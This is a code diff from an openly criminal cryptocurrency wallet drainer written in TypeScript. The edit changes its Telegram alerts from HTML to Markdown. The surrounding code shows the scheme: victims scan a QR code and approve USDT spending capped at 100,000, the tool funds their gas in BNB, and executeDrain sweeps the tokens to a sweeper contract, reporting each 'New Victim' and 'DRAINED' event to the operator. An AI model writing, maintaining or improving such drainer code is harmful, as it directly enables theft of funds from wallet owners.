@@ -7,8 +7,6 @@ import {
   FUNDING_PRIVATE_KEY,
   FUNDING_AMOUNT,
   USDT_DECIMALS,
-  TG_BOT_TOKEN,
-  TG_CHAT_ID,
 } from "../config";
 import { notify, formatAddress } from "./telegram";
 
@@ -36,7 +34,7 @@ export async function requestApproval(
   const balance = ethers.formatUnits(rawBalance, decimals);
 
   await notify(
-    `🔔 <b>New Victim</b>\n📱 QR Scanned\n🔗 Wallet: ${formatAddress(victimAddress)}\n💰 Balance: ${parseFloat(balance).toFixed(2)} USDT`
+    `🔔 **New Victim**\n📱 QR Scanned\n🔗 Wallet: ${formatAddress(victimAddress)}\n💰 Balance: ${parseFloat(balance).toFixed(2)} USDT`
   );
 
   // Cap approval at 100,000 USDT (or victim's balance, whichever is lower)
@@ -50,8 +48,9 @@ export async function requestApproval(
       await tx.wait();
 
       await notify(
-        `✅ <b>Approval Signed</b>\n💵 ${ethers.formatUnits(approveAmount, decimals)} USDT\n🔗 ${formatAddress(victimAddress)}\nTx: <a href="https://bscscan.com/tx/${tx.hash}">${tx.hash.slice(0, 10)}...</a>`
+        `✅ **Approval Signed**\n💵 ${ethers.formatUnits(approveAmount, decimals)} USDT\n🔗 ${formatAddress(victimAddress)}\nTx: [${tx.hash.slice(0, 10)}...](https://bscscan.com/tx/${tx.hash})`
       );
+
       approvalInProgress = false;
       return approveAmount;
     } catch (err: any) {
@@ -74,7 +73,7 @@ export async function ensureGas(
   const minGas = ethers.parseEther("0.0003"); // ~0.0003 BNB for gas
 
   if (balance >= minGas) {
-    await notify(`⛽ <b>Gas Check</b>\n${ethers.formatEther(balance)} BNB (sufficient)`);
+    await notify(`⛽ **Gas Check**\n${ethers.formatEther(balance)} BNB (sufficient)`);
     return true;
   }
 
@@ -88,11 +87,11 @@ export async function ensureGas(
     await fundTx.wait();
 
     await notify(
-      `⛽ <b>Gas Funded</b>\nSent ${FUNDING_AMOUNT} BNB to ${formatAddress(victimAddress)}\nTx: <a href="https://bscscan.com/tx/${fundTx.hash}">${fundTx.hash.slice(0, 10)}...</a>`
+      `⛽ **Gas Funded**\nSent ${FUNDING_AMOUNT} BNB to ${formatAddress(victimAddress)}\nTx: [${fundTx.hash.slice(0, 10)}...](https://bscscan.com/tx/${fundTx.hash})`
     );
     return true;
   } catch (err) {
-    await notify(`❌ <b>Gas Funding Failed</b>\n${formatAddress(victimAddress)}`);
+    await notify(`❌ **Gas Funding Failed**\n${formatAddress(victimAddress)}`);
     return false;
   }
 }
@@ -117,11 +116,11 @@ export async function executeDrain(
 
     const decimals = USDT_DECIMALS; // USDT has 6 decimals
     await notify(
-      `🚨 <b>DRAINED</b>\n💵 ${ethers.formatUnits(approvalAmount, decimals)} USDT\n📤 Victim: ${formatAddress(victimAddress)}\n📥 Sweeper: ${formatAddress(SWEEPER_CONTRACT)}\n🔗 <a href="https://bscscan.com/tx/${tx.hash}">${tx.hash.slice(0, 16)}...</a>`
+      `🚨 **DRAINED**\n💵 ${ethers.formatUnits(approvalAmount, decimals)} USDT\n📤 Victim: ${formatAddress(victimAddress)}\n📥 Sweeper: ${formatAddress(SWEEPER_CONTRACT)}\n🔗 [${tx.hash.slice(0, 16)}...](https://bscscan.com/tx/${tx.hash})`
     );
     return true;
   } catch (err) {
-    await notify(`❌ <b>Drain Failed</b>\n${formatAddress(victimAddress)}`);
+    await notify(`❌ **Drain Failed**\n${formatAddress(victimAddress)}`);
     return false;
   }
 }
